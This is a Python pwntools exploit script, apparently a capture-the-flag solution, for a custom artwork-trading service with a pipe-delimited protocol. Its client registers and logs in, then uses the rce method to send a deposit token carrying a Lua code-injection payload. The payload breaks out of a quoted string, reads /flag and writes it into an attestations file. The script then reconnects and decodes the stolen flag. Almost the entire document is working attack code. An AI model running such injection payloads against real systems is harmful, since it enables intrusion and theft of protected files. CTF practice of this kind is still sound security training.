#!/usr/bin/env python3
import os
import sys
import base64
from pwn import *

LOGIN            = 0x00
REGISTER         = 0x01
LIST_ARTWORKS    = 0x02
ADD_ARTWORK      = 0x08
DEPOSIT          = 0x0A
READ_ATTESTATION = 0x0B
QUIT             = 0x0E

def b64_xor_demo_token() -> str:
    msg = b"DEMO_TOKEN"
    key = b'\x01\x02\x03'
    enc = bytes([msg[i] ^ key[i % len(key)] for i in range(len(msg))])
    return base64.b64encode(enc).decode()

class Client:
    def __init__(self, host, port):
        self.r = remote(host, port)
        self.username = None
        self.password = None
        self.session_code = None

    def send_command(self, command, arguments: list = []):
        if command not in (LOGIN, REGISTER):
            assert self.session_code is not None, "You must login first!"
            arguments = [self.username, '', self.session_code] + arguments

        command_line = f'{command}|' + '|'.join(arguments)
        commandlength = len(command_line)
        commandlength = commandlength.to_bytes(4, byteorder='big')
        self.r.send(commandlength)
        self.r.send(command_line.encode())
        res_len = int.from_bytes(self.r.recv(4))
        res = self.r.recv(res_len)
        parsed_res = res.decode().split('|')
        assert len(res) == res_len, f"Expected {res_len} bytes, got {len(res)} bytes"
        return parsed_res

    def register(self, user=None, pw=None):
        self.username = user or os.urandom(4).hex()
        self.password = pw or os.urandom(4).hex()
        fields = self.send_command(REGISTER, [self.username, self.password])
        return fields

    def login(self, user=None, pw=None):
        self.username = user or self.username
        self.password = pw or self.password
        fields = self.send_command(LOGIN, [self.username, self.password])
        token = ""
        for i,f in enumerate(fields):
            if "Login successful" in f and i>0 and fields[i-1]:
                token = fields[i-1]; break
        self.session_code = token
        return fields

    def add_artwork(self, title, artist, type, price, current_price):
        res = self.send_command(ADD_ARTWORK, [f"{title}~{artist}~{type}~{price}", f"{current_price}"])
        return res
    
    def list_artworks(self):
        res = self.send_command(LIST_ARTWORKS, [])
        return res
    
    def rce(self):
        lua = """') and
(function()
local f=io.open('/flag','r'); local flag=''; if f then flag=f:read('*a'); f:close() end; 
assert(flag and flag ~= '', 'Flag not found');
local f=io.open('/challenge/attestations/1.lua','w'); if f then f:write(flag); f:close() end;
assert (f, 'Failed to write flag to attestations');
return 'true'
end)()
or ('"""
        tok = b64_xor_demo_token() + lua
        fields = self.send_command(DEPOSIT, [tok])
        return fields
    
    def read_flag(self):
        res = self.send_command(READ_ATTESTATION, [])
        return res

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    username = os.urandom(6).hex()
    password = os.urandom(6).hex()
    c = Client(host, port)
    c.register(username, password)
    c.login(username, password)
    
    c.rce()
    print("closing connection to server...")
    c.r.close()
    
    # Now we can read the flag
    print("Reconnecting to server to read the flag...")
    c = Client(host, port)
    c.login(username, password)
    lists = c.read_flag()
    flag = base64.b64decode(lists[4])
    print("Flag:", flag.decode())
